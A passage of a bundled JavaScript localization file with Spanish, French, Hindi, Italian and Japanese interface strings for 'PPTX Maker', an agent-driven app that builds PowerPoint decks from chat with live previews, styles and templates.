			"highlight_2": "Vista previa en vivo de cada entregable: briefing, esquema, dirección de arte y luego las diapositivas como SVG animado mientras se componen",
			"highlight_3": "Los estilos definen el aire visual y las plantillas .pptx definen la estructura, así una presentación puede cambiar de apariencia sin reescribir el contenido",
			"highlight_4": "Importa tu propio estilo HTML o una plantilla .pptx existente y el agente sigue sus colores, tipografías y composiciones",
			"highlight_5": "Abre el archivo terminado o muestra su carpeta sin salir del panel",
			"highlight_6": "Envuelve el motor público spec-driven-presentation-maker, descargado en una versión fijada por sha256; nada que instalar a mano",
			"page_label": "PPTX Maker",
			"use_case_1": "Convierte una idea, una URL o un texto de origen en una presentación real con vistas previas de diapositivas en vivo y estilos visuales reutilizables.",
			"configuration_1": "Instala el motor con versión fijada en el primer uso y, si quieres, LibreOffice para más vistas previas; elige un directorio de salida e importa los estilos HTML o plantillas PPTX que quieras reutilizar."
		},
		"pptxMakerPage": {
			"deck_output_directory": "Carpeta de salida de las presentaciones",
			"deck_output_directory_tip": "Donde se escriben las presentaciones terminadas. El agente lee y escribe presentaciones dentro de esta carpeta.",
			"decks": "Presentaciones",
			"decks_tip": "Todas las presentaciones que el motor ha producido en la carpeta de salida. Elige una para seguir sus resultados.",
			"engine_install_failed": "No se pudo instalar el motor de presentaciones.",
			"engine_installing": "Instalando el motor de presentaciones… {{seconds}}s",
			"engine_not_installed": "El motor de presentaciones todavía no está instalado.",
			"engine_requirements": "Descarga una copia verificada del motor: no hay nada que instalar. Fijado en {{tag}}.",
			"icon_packs_failed": "No se pudieron instalar los paquetes de iconos.",
			"icon_packs_hint": "El agente los necesita para componer las diapositivas. Descarga los dos conjuntos de iconos gratuitos del motor (unos 40 MB).",
			"icon_packs_installing": "Instalando los paquetes de iconos… {{seconds}} s",
			"icon_packs_missing": "Los paquetes de iconos aún no están instalados.",
			"install_engine": "Instalar el motor",
			"install_icon_packs": "Instalar paquetes de iconos",
			"loading": "Cargando…",
			"mode_spec": "Modo especificación",
			"mode_spec_hint": "Primero una entrevista, luego un briefing, un esquema y una dirección de arte antes de cualquier diapositiva.",
			"mode_style": "Creador de estilos",
			"mode_style_hint": "Crea un estilo reutilizable que puedas aplicar a cualquier presentación posterior.",
			"mode_vibe": "Modo directo",
			"mode_vibe_hint": "Pega una URL o algo de texto y obtén diapositivas al instante.",
			"no_decks_yet": "Aún no hay presentaciones",
			"no_decks_yet_hint": "Empieza una arriba y el agente la escribirá aquí.",
			"no_matching_decks": "Ninguna presentación coincide con esa búsqueda",
			"optional_deps_missing": "{{labels}} no está instalado, así que las miniaturas de diapositiva y la vista previa en PDF no están disponibles.",
			"optional_deps_missing_with_hint": "{{labels}} no está instalado, así que las miniaturas de diapositiva y la vista previa en PDF no están disponibles. Instálalo con: {{command}}",
			"reset": "Restablecer",
			"retry_install": "Reintentar la instalación",
			"save": "Guardar",
			"saved": "Guardado.",
			"search_decks": "Buscar presentaciones…",
			"select_a_deck": "Elige una presentación para abrirla.",
			"slide_count_many": "{{count}} diapositivas",
			"slide_count_one": "{{count}} diapositiva",
			"slide_count_other": "{{count}} diapositivas",
			"start_a_deck": "Empezar una presentación",
			"start_a_deck_tip": "Las presentaciones se generan en el chat. Elige un modo y la app abre una sesión con el agente que lo ejecuta.",
			"stat_decks": "Presentaciones",
			"stat_finished": "Archivos terminados",
			"stat_slides": "Diapositivas",
			"stat_styles": "Estilos",
			"stat_templates": "Plantillas",
			"subtitle": "Describe una presentación en el chat y mírala convertirse en un .pptx real",
			"title": "PPTX Maker",
			"view_decks": "Presentaciones",
			"view_library": "Biblioteca",
			"view_settings": "Ajustes",
			"view_styles": "Estilos",
			"view_templates": "Plantillas"
		},
		"slidePreview": { "preview_unavailable": "Vista previa no disponible" }
	} } },
	fr: { apps: { "pptxMaker": {
		"boardFrame": {
			"loading": "Chargement de l’aperçu…",
			"thumbnail": "Vignette du style"
		},
		"deckViewer": {
			"copy_folder_path": "Copier le chemin du dossier",
			"deck_not_found": "Présentation introuvable",
			"download_pptx": "Télécharger le .pptx",
			"folder_path_copied": "Chemin du dossier copié",
			"loading": "Chargement…",
			"no_slides_yet": "Aucune diapositive pour l’instant",
			"slides_appear_as_the_agent_composes_them": "Les diapositives apparaissent ici à mesure que l’agent les compose.",
			"tab_art_direction": "Direction artistique",
			"tab_brief": "Briefing",
			"tab_outline": "Plan",
			"tab_slides": "Diapositives",
			"unavailable": "Ce livrable n’a pas pu être lu."
		},
		"libraryPanel": {
			"accepts_html": "Accepte un document de style .html",
			"accepts_pptx": "Accepte un fichier .pptx",
			"built_in": "Fournis",
			"cancel": "Annuler",
			"delete": "Supprimer",
			"font_specimen": "Aa",
			"fonts": "Polices : {{fonts}}",
			"import_style": "Importer un style",
			"import_template": "Importer un modèle",
			"layouts_many": "{{count}} mises en page",
			"layouts_one": "{{count}} mise en page",
			"layouts_other": "{{count}} mises en page",
			"loading": "Chargement…",
			"mine": "Les vôtres",
			"new_name": "Nouveau nom",
			"no_styles_yet": "Aucun style pour l’instant",
			"no_templates_yet": "Aucun modèle pour l’instant",
			"pin_style": "Épingler ce style",
			"pinned": "Épinglé",
			"reference_in_chat": "Mentionnez-le dans la discussion ainsi :",
			"rename": "Renommer",
			"save": "Enregistrer",
			"select_a_style": "Choisissez un style pour l’afficher.",
			"select_a_template": "Choisissez un modèle pour l’afficher.",
			"style_preview": "Aperçu du style",
			"styles": "Styles",
			"styles_tip": "Un style, c’est l’ambiance visuelle — couleurs, typographie et sensation de mise en page. L’agent le suit quand il compose les diapositives.",
			"templates": "Modèles",
			"templates_tip": "Un modèle est un masque de diapositives .pptx. Il fixe les couleurs du thème, les polices et les mises en page disponibles.",
			"unpin_style": "Détacher ce style"
		},
		"manifest": {
			"description": "Décris dans le chat la présentation que tu veux et récupère un vrai fichier .pptx. Un agent t’interroge, rédige un brief, un plan et une direction artistique, puis compose chaque diapositive et génère le fichier — et tu vois chaque livrable apparaître dans un aperçu en direct, à côté de la conversation. Les diapositives sont rendues en SVG animé au fil de leur construction, pour voir une présentation prendre forme au lieu d’attendre un téléchargement. Des styles et des modèles .pptx réutilisables permettent au même contenu de ressembler à trois présentations différentes.",
			"display_name": "PPTX Maker",
			"highlight_1": "Discute jusqu’à obtenir un .pptx terminé — le mode spécification planifie avec soin, le mode direct transforme une URL ou du texte collé directement en diapositives",
			"highlight_2": "Aperçu en direct de chaque livrable : brief, plan, direction artistique, puis diapositives en SVG animé pendant leur composition",
			"highlight_3": "Les styles fixent l’ambiance visuelle et les modèles .pptx fixent la structure, pour rhabiller une présentation sans réécrire son contenu",
			"highlight_4": "Importe ton propre style HTML ou un modèle .pptx existant, et l’agent en respecte les couleurs, les polices et les mises en page",
			"highlight_5": "Ouvre le fichier terminé ou affiche son dossier sans quitter le tableau de bord",
			"highlight_6": "Encapsule le moteur public spec-driven-presentation-maker, récupéré à une version épinglée par sha256 ; rien à installer à la main",
			"page_label": "PPTX Maker",
			"use_case_1": "Transforme une idée, une URL ou un texte source en véritable présentation avec prévisualisation des diapositives en direct et styles visuels réutilisables.",
			"configuration_1": "Installe le moteur épinglé lors de la première utilisation, éventuellement LibreOffice pour davantage de prévisualisations, choisis un dossier de sortie et importe les styles HTML ou modèles PPTX à réutiliser."
		},
		"pptxMakerPage": {
			"deck_output_directory": "Dossier de sortie des présentations",
			"deck_output_directory_tip": "Où sont écrites les présentations terminées. L’agent lit et écrit les présentations dans ce dossier.",
			"decks": "Présentations",
			"decks_tip": "Toutes les présentations que le moteur a produites dans le dossier de sortie. Choisissez-en une pour suivre ses livrables.",
			"engine_install_failed": "Le moteur de présentation n’a pas pu être installé.",
			"engine_installing": "Installation du moteur de présentation… {{seconds}} s",
			"engine_not_installed": "Le moteur de présentation n’est pas encore installé.",
			"engine_requirements": "Télécharge une copie vérifiée du moteur — rien à installer. Figé sur {{tag}}.",
			"icon_packs_failed": "Les packs d’icônes n’ont pas pu être installés.",
			"icon_packs_hint": "L’agent en a besoin pour composer les diapositives. Télécharge les deux jeux d’icônes gratuits du moteur (environ 40 Mo).",
			"icon_packs_installing": "Installation des packs d’icônes… {{seconds}} s",
			"icon_packs_missing": "Les packs d’icônes ne sont pas encore installés.",
			"install_engine": "Installer le moteur",
			"install_icon_packs": "Installer les packs d’icônes",
			"loading": "Chargement…",
			"mode_spec": "Mode spécification",
			"mode_spec_hint": "D’abord un entretien, puis un brief, un plan et une direction artistique avant la moindre diapositive.",
			"mode_style": "Créateur de styles",
			"mode_style_hint": "Construisez un style réutilisable, applicable à toute présentation ultérieure.",
			"mode_vibe": "Mode direct",
			"mode_vibe_hint": "Collez une URL ou un peu de texte et obtenez des diapositives aussitôt.",
			"no_decks_yet": "Aucune présentation pour l’instant",
			"no_decks_yet_hint": "Lancez-en une ci-dessus et l’agent l’écrira ici.",
			"no_matching_decks": "Aucune présentation ne correspond à cette recherche",
			"optional_deps_missing": "{{labels}} n’est pas installé : les vignettes de diapositive et l’aperçu PDF sont donc indisponibles.",
			"optional_deps_missing_with_hint": "{{labels}} n’est pas installé : les vignettes de diapositive et l’aperçu PDF sont donc indisponibles. Installez-le avec : {{command}}",
			"reset": "Réinitialiser",
			"retry_install": "Réessayer l’installation",
			"save": "Enregistrer",
			"saved": "Enregistré.",
			"search_decks": "Rechercher des présentations…",
			"select_a_deck": "Choisissez une présentation pour l’ouvrir.",
			"slide_count_many": "{{count}} diapositives",
			"slide_count_one": "{{count}} diapositive",
			"slide_count_other": "{{count}} diapositives",
			"start_a_deck": "Lancer une présentation",
			"start_a_deck_tip": "Les présentations se créent dans la discussion. Choisissez un mode et l’app ouvre une session avec l’agent qui l’exécute.",
			"stat_decks": "Présentations",
			"stat_finished": "Fichiers terminés",
			"stat_slides": "Diapositives",
			"stat_styles": "Styles",
			"stat_templates": "Modèles",
			"subtitle": "Décrivez une présentation dans la discussion et regardez-la devenir un vrai .pptx",
			"title": "PPTX Maker",
			"view_decks": "Présentations",
			"view_library": "Bibliothèque",
			"view_settings": "Réglages",
			"view_styles": "Styles",
			"view_templates": "Modèles"
		},
		"slidePreview": { "preview_unavailable": "Aperçu indisponible" }
	} } },
	hi: { apps: /* @__PURE__ */ JSON.parse("{\"pptxMaker\":{\"boardFrame\":{\"loading\":\"पूर्वावलोकन लोड हो रहा है…\",\"thumbnail\":\"शैली का थंबनेल\"},\"deckViewer\":{\"copy_folder_path\":\"फ़ोल्डर का पाथ कॉपी करें\",\"deck_not_found\":\"प्रस्तुति नहीं मिली\",\"download_pptx\":\".pptx डाउनलोड करें\",\"folder_path_copied\":\"फ़ोल्डर का पाथ कॉपी हो गया\",\"loading\":\"लोड हो रहा है…\",\"no_slides_yet\":\"अभी कोई स्लाइड नहीं\",\"slides_appear_as_the_agent_composes_them\":\"जैसे-जैसे एजेंट स्लाइड बनाता है, वे यहाँ दिखने लगती हैं।\",\"tab_art_direction\":\"कला निर्देशन\",\"tab_brief\":\"ब्रीफ़\",\"tab_outline\":\"रूपरेखा\",\"tab_slides\":\"स्लाइड\",\"unavailable\":\"यह सामग्री पढ़ी नहीं जा सकी।\"},\"libraryPanel\":{\"accepts_html\":\".html शैली दस्तावेज़ स्वीकार करता है\",\"accepts_pptx\":\".pptx फ़ाइल स्वीकार करता है\",\"built_in\":\"साथ आए\",\"cancel\":\"रद्द करें\",\"delete\":\"हटाएँ\",\"font_specimen\":\"Aa\",\"fonts\":\"फ़ॉन्ट: {{fonts}}\",\"import_style\":\"शैली आयात करें\",\"import_template\":\"टेम्पलेट आयात करें\",\"layouts_one\":\"{{count}} लेआउट\",\"layouts_other\":\"{{count}} लेआउट\",\"loading\":\"लोड हो रहा है…\",\"mine\":\"तुम्हारे\",\"new_name\":\"नया नाम\",\"no_styles_yet\":\"अभी कोई शैली नहीं\",\"no_templates_yet\":\"अभी कोई टेम्पलेट नहीं\",\"pin_style\":\"इस शैली को पिन करें\",\"pinned\":\"पिन किया\",\"reference_in_chat\":\"चैट में इसे इस तरह बताएँ:\",\"rename\":\"नाम बदलें\",\"save\":\"सहेजें\",\"select_a_style\":\"पूर्वावलोकन के लिए कोई शैली चुनें।\",\"select_a_template\":\"पूर्वावलोकन के लिए कोई टेम्पलेट चुनें।\",\"style_preview\":\"शैली का पूर्वावलोकन\",\"styles\":\"शैलियाँ\",\"styles_tip\":\"शैली दृश्य मिज़ाज तय करती है — रंग, टाइपोग्राफ़ी और लेआउट का एहसास। स्लाइड बनाते समय एजेंट इसका पालन करता है।\",\"templates\":\"टेम्पलेट\",\"templates_tip\":\"टेम्पलेट एक .pptx स्लाइड मास्टर है। यह थीम के रंग, फ़ॉन्ट और उपलब्ध लेआउट तय करता है।\",\"unpin_style\":\"इस शैली को अनपिन करें\"},\"manifest\":{\"description\":\"चैट में बताओ कि कैसा डेक चाहिए और असली .pptx वापस पाओ। एक एजेंट तुमसे सवाल पूछता है, ब्रीफ़, आउटलाइन और आर्ट डायरेक्शन लिखता है, फिर हर स्लाइड बनाता है और फ़ाइल तैयार करता है — और हर चीज़ बातचीत के साथ-साथ लाइव प्रीव्यू में दिखती जाती है। स्लाइड बनते वक़्त एनिमेटेड SVG के रूप में रेंडर होती हैं, इसलिए डाउनलोड का इंतज़ार करने की जगह डेक को आकार लेते देख सकते हो। दोबारा इस्तेमाल होने वाली स्टाइल और .pptx टेम्पलेट एक ही सामग्री को तीन अलग प्रेज़ेंटेशन जैसा दिखा सकते हैं।\",\"display_name\":\"PPTX Maker\",\"use_case_1\":\"किसी विचार, URL या स्रोत पाठ को लाइव slide preview और दोबारा उपयोग योग्य visual style वाली असली प्रस्तुति में बदलें।\",\"configuration_1\":\"पहली बार pinned engine इंस्टॉल करें, अधिक preview के लिए चाहें तो LibreOffice इंस्टॉल करें, output directory चुनें और दोबारा उपयोग करने के लिए HTML style या PPTX template import करें।\",\"highlight_1\":\"बातचीत से पूरी .pptx तक पहुँचो — Spec मोड सोच-समझकर योजना बनाता है, Vibe मोड किसी URL या चिपकाए टेक्स्ट को सीधे स्लाइड में बदल देता है\",\"highlight_2\":\"हर चीज़ का लाइव प्रीव्यू: ब्रीफ़, आउटलाइन, आर्ट डायरेक्शन, और बनते वक़्त एनिमेटेड SVG के रूप में स्लाइड\",\"highlight_3\":\"स्टाइल विज़ुअल मूड तय करती हैं और .pptx टेम्पलेट ढाँचा, इसलिए सामग्री दोबारा लिखे बिना एक डेक की शक्ल बदली जा सकती है\",\"highlight_4\":\"अपनी HTML स्टाइल या मौजूदा .pptx टेम्पलेट इम्पोर्ट करो और एजेंट उसके रंग, फ़ॉन्ट और लेआउट का पालन करता है\",\"highlight_5\":\"डैशबोर्ड छोड़े बिना तैयार फ़ाइल खोलो या उसका फ़ोल्डर दिखाओ\",\"highlight_6\":\"सार्वजनिक spec-driven-presentation-maker इंजन को लपेटता है, जो sha256 पर पिन किए वर्शन से लाया जाता है; हाथ से कुछ इंस्टॉल नहीं करना पड़ता\",\"page_label\":\"PPTX Maker\"},\"pptxMakerPage\":{\"deck_output_directory\":\"प्रस्तुति आउटपुट फ़ोल्डर\",\"deck_output_directory_tip\":\"तैयार प्रस्तुतियाँ कहाँ लिखी जाती हैं। एजेंट इसी फ़ोल्डर में प्रस्तुतियाँ पढ़ता और लिखता है।\",\"decks\":\"प्रस्तुतियाँ\",\"decks_tip\":\"आउटपुट फ़ोल्डर में इंजन द्वारा बनाई गई सभी प्रस्तुतियाँ। किसी एक को चुनकर उसकी सामग्री देखें।\",\"engine_install_failed\":\"प्रस्तुति इंजन इंस्टॉल नहीं हो सका।\",\"engine_installing\":\"प्रस्तुति इंजन इंस्टॉल हो रहा है… {{seconds}} से॰\",\"engine_not_installed\":\"प्रस्तुति इंजन अभी इंस्टॉल नहीं है।\",\"engine_requirements\":\"इंजन की सत्यापित प्रतिलिपि डाउनलोड करता है — कुछ भी इंस्टॉल करने की ज़रूरत नहीं। {{tag}} पर तय किया गया।\",\"icon_packs_failed\":\"आइकन पैक इंस्टॉल नहीं हो सके।\",\"icon_packs_hint\":\"स्लाइड बनाने के लिए एजेंट को इनकी ज़रूरत है। इंजन के दो मुफ़्त आइकन सेट डाउनलोड करता है (लगभग 40 MB)।\",\"icon_packs_installing\":\"आइकन पैक इंस्टॉल हो रहे हैं… {{seconds}} से\",\"icon_packs_missing\":\"आइकन पैक अभी इंस्टॉल नहीं हुए हैं।\",\"install_engine\":\"इंजन इंस्टॉल करें\",\"install_icon_packs\":\"आइकन पैक इंस्टॉल करें\",\"loading\":\"लोड हो रहा है…\",\"mode_spec\":\"विवरण मोड\",\"mode_spec_hint\":\"पहले बातचीत, फिर ब्रीफ़, रूपरेखा और कला निर्देशन — स्लाइड सबसे बाद में।\",\"mode_style\":\"शैली रचयिता\",\"mode_style_hint\":\"एक पुनःप्रयोज्य शैली बनाएँ, जिसे बाद की किसी भी प्रस्तुति पर लगाया जा सके।\",\"mode_vibe\":\"झटपट मोड\",\"mode_vibe_hint\":\"कोई URL या थोड़ा पाठ चिपकाएँ और सीधे स्लाइड पाएँ।\",\"no_decks_yet\":\"अभी कोई प्रस्तुति नहीं\",\"no_decks_yet_hint\":\"ऊपर एक शुरू करें और एजेंट उसे यहाँ लिख देगा।\",\"no_matching_decks\":\"इस खोज से कोई प्रस्तुति मेल नहीं खाती\",\"optional_deps_missing\":\"{{labels}} इंस्टॉल नहीं है, इसलिए स्लाइड थंबनेल और PDF पूर्वावलोकन उपलब्ध नहीं हैं।\",\"optional_deps_missing_with_hint\":\"{{labels}} इंस्टॉल नहीं है, इसलिए स्लाइड थंबनेल और PDF पूर्वावलोकन उपलब्ध नहीं हैं। इसे इससे इंस्टॉल करें: {{command}}\",\"reset\":\"रीसेट करें\",\"retry_install\":\"इंस्टॉल फिर आज़माएँ\",\"save\":\"सहेजें\",\"saved\":\"सहेजा गया।\",\"search_decks\":\"प्रस्तुतियाँ खोजें…\",\"select_a_deck\":\"खोलने के लिए कोई प्रस्तुति चुनें।\",\"slide_count_one\":\"{{count}} स्लाइड\",\"slide_count_other\":\"{{count}} स्लाइड\",\"start_a_deck\":\"प्रस्तुति शुरू करें\",\"start_a_deck_tip\":\"प्रस्तुतियाँ चैट में बनती हैं। कोई मोड चुनें और ऐप उसे चलाने वाले एजेंट के साथ सत्र खोल देगा।\",\"stat_decks\":\"प्रस्तुतियाँ\",\"stat_finished\":\"तैयार फ़ाइलें\",\"stat_slides\":\"स्लाइड\",\"stat_styles\":\"शैलियाँ\",\"stat_templates\":\"टेम्पलेट\",\"subtitle\":\"चैट में प्रस्तुति का वर्णन करें और उसे असली .pptx बनते देखें\",\"title\":\"PPTX Maker\",\"view_decks\":\"प्रस्तुतियाँ\",\"view_library\":\"लाइब्रेरी\",\"view_settings\":\"सेटिंग्स\",\"view_styles\":\"शैलियाँ\",\"view_templates\":\"टेम्पलेट\"},\"slidePreview\":{\"preview_unavailable\":\"पूर्वावलोकन उपलब्ध नहीं\"}}}") },
	it: { apps: { "pptxMaker": {
		"boardFrame": {
			"loading": "Caricamento dell’anteprima…",
			"thumbnail": "Miniatura dello stile"
		},
		"deckViewer": {
			"copy_folder_path": "Copia il percorso della cartella",
			"deck_not_found": "Presentazione non trovata",
			"download_pptx": "Scarica il .pptx",
			"folder_path_copied": "Percorso della cartella copiato",
			"loading": "Caricamento…",
			"no_slides_yet": "Ancora nessuna diapositiva",
			"slides_appear_as_the_agent_composes_them": "Le diapositive appaiono qui man mano che l’agente le compone.",
			"tab_art_direction": "Direzione artistica",
			"tab_brief": "Briefing",
			"tab_outline": "Scaletta",
			"tab_slides": "Diapositive",
			"unavailable": "Non è stato possibile leggere questo elaborato."
		},
		"libraryPanel": {
			"accepts_html": "Accetta un documento di stile .html",
			"accepts_pptx": "Accetta un file .pptx",
			"built_in": "In dotazione",
			"cancel": "Annulla",
			"delete": "Elimina",
			"font_specimen": "Aa",
			"fonts": "Caratteri: {{fonts}}",
			"import_style": "Importa uno stile",
			"import_template": "Importa un modello",
			"layouts_many": "{{count}} layout",
			"layouts_one": "{{count}} layout",
			"layouts_other": "{{count}} layout",
			"loading": "Caricamento…",
			"mine": "I tuoi",
			"new_name": "Nuovo nome",
			"no_styles_yet": "Ancora nessuno stile",
			"no_templates_yet": "Ancora nessun modello",
			"pin_style": "Fissa questo stile",
			"pinned": "Fissato",
			"reference_in_chat": "Richiamalo in chat così:",
			"rename": "Rinomina",
			"save": "Salva",
			"select_a_style": "Scegli uno stile per vederlo.",
			"select_a_template": "Scegli un modello per vederlo.",
			"style_preview": "Anteprima dello stile",
			"styles": "Stili",
			"styles_tip": "Uno stile è l’atmosfera visiva — colori, tipografia e resa dell’impaginazione. L’agente lo segue quando compone le diapositive.",
			"templates": "Modelli",
			"templates_tip": "Un modello è uno schema diapositiva .pptx. Fissa i colori del tema, i caratteri e i layout disponibili.",
			"unpin_style": "Sblocca questo stile"
		},
		"manifest": {
			"description": "Descrivi in chat la presentazione che vuoi e ricevi un vero .pptx. Un agente ti intervista, scrive un brief, una scaletta e una direzione artistica, poi compone ogni diapositiva e genera il file — e tu vedi ogni risultato comparire in un’anteprima dal vivo accanto alla conversazione. Le diapositive vengono rese come SVG animato mentre le costruisce, così vedi la presentazione prendere forma invece di aspettare un download. Stili riutilizzabili e modelli .pptx fanno sì che lo stesso contenuto possa sembrare tre presentazioni diverse.",
			"display_name": "PPTX Maker",
			"highlight_1": "Arriva a un .pptx finito chiacchierando — la modalità specifica pianifica con cura, la modalità rapida trasforma un URL o del testo incollato direttamente in diapositive",
			"highlight_2": "Anteprima dal vivo di ogni risultato: brief, scaletta, direzione artistica e poi le diapositive come SVG animato mentre si compongono",
			"highlight_3": "Gli stili definiscono l’atmosfera visiva e i modelli .pptx la struttura, così una presentazione può cambiare aspetto senza riscriverne il contenuto",
			"highlight_4": "Importa un tuo stile HTML o un modello .pptx esistente e l’agente ne segue colori, caratteri e layout",
			"highlight_5": "Apri il file finito o mostra la sua cartella senza uscire dalla dashboard",
			"highlight_6": "Incapsula il motore pubblico spec-driven-presentation-maker, scaricato a una versione fissata con sha256; niente da installare a mano",
			"page_label": "PPTX Maker",
			"use_case_1": "Trasforma un'idea, un URL o un testo sorgente in una vera presentazione con anteprime live delle slide e stili visivi riutilizzabili.",
			"configuration_1": "Al primo utilizzo installa il motore con versione bloccata, facoltativamente LibreOffice per più anteprime, scegli una directory di output e importa gli stili HTML o i modelli PPTX da riutilizzare."
		},
		"pptxMakerPage": {
			"deck_output_directory": "Cartella di output delle presentazioni",
			"deck_output_directory_tip": "Dove vengono scritte le presentazioni finite. L’agente legge e scrive le presentazioni in questa cartella.",
			"decks": "Presentazioni",
			"decks_tip": "Tutte le presentazioni che il motore ha prodotto nella cartella di output. Scegline una per seguirne gli elaborati.",
			"engine_install_failed": "Non è stato possibile installare il motore di presentazione.",
			"engine_installing": "Installazione del motore di presentazione… {{seconds}} s",
			"engine_not_installed": "Il motore di presentazione non è ancora installato.",
			"engine_requirements": "Scarica una copia verificata del motore: non c'è nulla da installare. Fissato a {{tag}}.",
			"icon_packs_failed": "Non è stato possibile installare i pacchetti di icone.",
			"icon_packs_hint": "All’agente servono per comporre le slide. Scarica i due set di icone gratuiti del motore (circa 40 MB).",
			"icon_packs_installing": "Installazione dei pacchetti di icone… {{seconds}} s",
			"icon_packs_missing": "I pacchetti di icone non sono ancora installati.",
			"install_engine": "Installa il motore",
			"install_icon_packs": "Installa i pacchetti di icone",
			"loading": "Caricamento…",
			"mode_spec": "Modalità specifica",
			"mode_spec_hint": "Prima un colloquio, poi un brief, una scaletta e una direzione artistica prima di qualsiasi diapositiva.",
			"mode_style": "Creatore di stili",
			"mode_style_hint": "Costruisci uno stile riutilizzabile da applicare a qualsiasi presentazione successiva.",
			"mode_vibe": "Modalità rapida",
			"mode_vibe_hint": "Incolla un URL o del testo e ottieni subito le diapositive.",
			"no_decks_yet": "Ancora nessuna presentazione",
			"no_decks_yet_hint": "Avviane una qui sopra e l’agente la scriverà qui.",
			"no_matching_decks": "Nessuna presentazione corrisponde a questa ricerca",
			"optional_deps_missing": "{{labels}} non è installato, quindi le miniature delle diapositive e l’anteprima PDF non sono disponibili.",
			"optional_deps_missing_with_hint": "{{labels}} non è installato, quindi le miniature delle diapositive e l’anteprima PDF non sono disponibili. Installalo con: {{command}}",
			"reset": "Reimposta",
			"retry_install": "Riprova l’installazione",
			"save": "Salva",
			"saved": "Salvato.",
			"search_decks": "Cerca presentazioni…",
			"select_a_deck": "Scegli una presentazione per aprirla.",
			"slide_count_many": "{{count}} diapositive",
			"slide_count_one": "{{count}} diapositiva",
			"slide_count_other": "{{count}} diapositive",
			"start_a_deck": "Avvia una presentazione",
			"start_a_deck_tip": "Le presentazioni nascono in chat. Scegli una modalità e l’app apre una sessione con l’agente che la esegue.",
			"stat_decks": "Presentazioni",
			"stat_finished": "File completati",
			"stat_slides": "Diapositive",
			"stat_styles": "Stili",
			"stat_templates": "Modelli",
			"subtitle": "Descrivi una presentazione in chat e guardala diventare un vero .pptx",
			"title": "PPTX Maker",
			"view_decks": "Presentazioni",
			"view_library": "Libreria",
			"view_settings": "Impostazioni",
			"view_styles": "Stili",
			"view_templates": "Modelli"
		},
		"slidePreview": { "preview_unavailable": "Anteprima non disponibile" }
	} } },
	ja: { apps: { "pptxMaker": {
		"boardFrame": {
			"loading": "プレビューを読み込み中…",
			"thumbnail": "スタイルサムネイル"
		},
		"deckViewer": {
			"copy_folder_path": "フォルダーのパスをコピー",
			"deck_not_found": "デッキが見つかりません",
			"download_pptx": ".pptx をダウンロード",
			"folder_path_copied": "フォルダーのパスをコピーしました",
			"loading": "読み込み中…",
			"no_slides_yet": "スライドはまだありません",
			"slides_appear_as_the_agent_composes_them": "エージェントがスライドを作成すると、ここに表示されます。",
			"tab_art_direction": "アートディレクション",
			"tab_brief": "ブリーフ",
			"tab_outline": "アウトライン",
			"tab_slides": "スライド",
			"unavailable": "この成果物は読み込めませんでした。"
		},
		"libraryPanel": {
			"accepts_html": ".html スタイルドキュメントを受け入れます",
			"accepts_pptx": ".pptx ファイルを受け入れます",
			"built_in": "バンドル済み",
			"cancel": "キャンセル",
			"delete": "削除",
			"font_specimen": "Aa",
			"fonts": "フォント: {{fonts}}",
			"import_style": "スタイルをインポート",
			"import_template": "テンプレートをインポート",
			"layouts_other": "{{count}} 個のレイアウト",
			"loading": "読み込み中…",
			"mine": "あなたのもの",
			"new_name": "新しい名前",
			"no_styles_yet": "スタイルはまだありません",
			"no_templates_yet": "テンプレートはまだありません",
			"pin_style": "このスタイルをピン留め",
			"pinned": "ピン留め済み",
			"reference_in_chat": "チャットで参照できます:",
			"rename": "名前を変更",
			"save": "保存",
			"select_a_style": "スタイルを選択してプレビューを表示します。",
			"select_a_template": "テンプレートを選択してプレビューを表示します。",
			"style_preview": "スタイルプレビュー",
			"styles": "スタイル",
			"styles_tip": "スタイルは視覚的なムード — 色、タイプ、レイアウトの感覚です。エージェントがスライドを作成するときにこれに従います。",
			"templates": "テンプレート",
			"templates_tip": "テンプレートは、スライドレイアウトがテーマの色、フォント、利用可能なレイアウトを設定する .pptx です。",
			"unpin_style": "このスタイルをピン留め解除"
		},
		"manifest": {
			"use_case_1": "アイデア、URL、元テキストを、ライブスライドプレビューと再利用可能なビジュアルスタイルを備えた実際のプレゼンテーションに変換します。",
			"configuration_1": "初回利用時に固定バージョンのエンジンをインストールし、必要に応じてプレビュー対応を広げる LibreOffice をインストールします。出力ディレクトリを選び、再利用する HTML スタイルや PPTX テンプレートをインポートします。",
			"description": "チャットでデッキについて説明し、実際の .pptx を取得します。エージェントがインタビューを行い、ブリーフ、アウトライン、アートディレクションを作成してからすべてのスライドを作成し、ファイルを生成します。会話の横に表示されるライブプレビューで各成果物を見ることができます。スライドは構築されるときにアニメーション SVG としてレンダリングされるため、ダウンロードを待つ代わりにデッキが構築される様子を見ることができます。再利用可能なスタイルと .pptx テンプレートにより、同じコンテンツを 3 つの異なるプレゼンテーションのように見せることができます。",
			"display_name": "PPTX Maker",
			"highlight_1": "チャットで完成した .pptx を実現 — 仕様モードは注意深く計画し、Vibe モードは URL または貼り付けたテキストをすぐにスライドに変換します",
			"highlight_2": "すべての成果物のライブプレビュー: ブリーフ、アウトライン、アートディレクション、その後は作成中のアニメーション SVG としてのスライド",
			"highlight_3": "スタイルが視覚的なムードを設定し、.pptx テンプレートが構造を設定するため、1 つのデッキをコンテンツを書き直さずに再スキン化できます",
			"highlight_4": "独自の HTML スタイルまたは既存の .pptx テンプレートをインポートすると、エージェントはその色、フォント、レイアウトに従います",
			"highlight_5": "完成したファイルを開くか、ダッシュボードを離れずにそのフォルダーを表示します",
			"highlight_6": "公開の仕様駆動型プレゼンテーションメーカーエンジンをラップし、sha256 ピン留めされたバージョンで取得します。手動でインストールするものはありません",
			"page_label": "PPTX Maker"
		},
		"pptxMakerPage": {
			"deck_output_directory": "デッキ出力ディレクトリ",
			"deck_output_directory_tip": "完成したデッキが書き込まれる場所。エージェントはこのフォルダーの下のデッキを読み書きします。",
			"decks": "デッキ",
			"decks_tip": "エンジンが出力ディレクトリの下で作成したすべてのデッキ。1 つを選択してその成果物を見ます。",
			"engine_install_failed": "プレゼンテーションエンジンをインストールできませんでした。",
			"engine_installing": "プレゼンテーションエンジンをインストール中… {{seconds}}s",
			"engine_not_installed": "プレゼンテーションエンジンはまだインストールされていません。",
			"engine_requirements": "エンジンの検証済みコピーをダウンロードします — インストールするものはありません。{{tag}} にピン留めされています。",
			"icon_packs_failed": "アイコンパックをインストールできませんでした。",
			"icon_packs_hint": "エージェントがスライドを作成するのに必要です。エンジンの無料アイコンセット 2 種類 (約 40 MB) をダウンロードします。",
			"icon_packs_installing": "アイコンパックをインストールしています… {{seconds}} 秒",
			"icon_packs_missing": "アイコンパックはまだインストールされていません。",
